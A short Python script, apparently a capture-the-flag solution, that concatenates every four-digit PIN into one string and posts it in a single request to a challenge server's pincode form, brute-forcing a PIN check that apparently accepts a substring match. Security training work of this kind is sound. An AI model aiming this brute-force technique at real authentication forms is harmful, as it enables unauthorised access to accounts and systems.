#!/bin/python3
import string, requests

result = ''

for i in string.digits:
    for j in string.digits:
        for k in string.digits:
            for c in string.digits:
                result += f"{i}{j}{k}{c}"

print(requests.post('http://pincode.challs.olicyber.it/', data={'pincode':result}).text)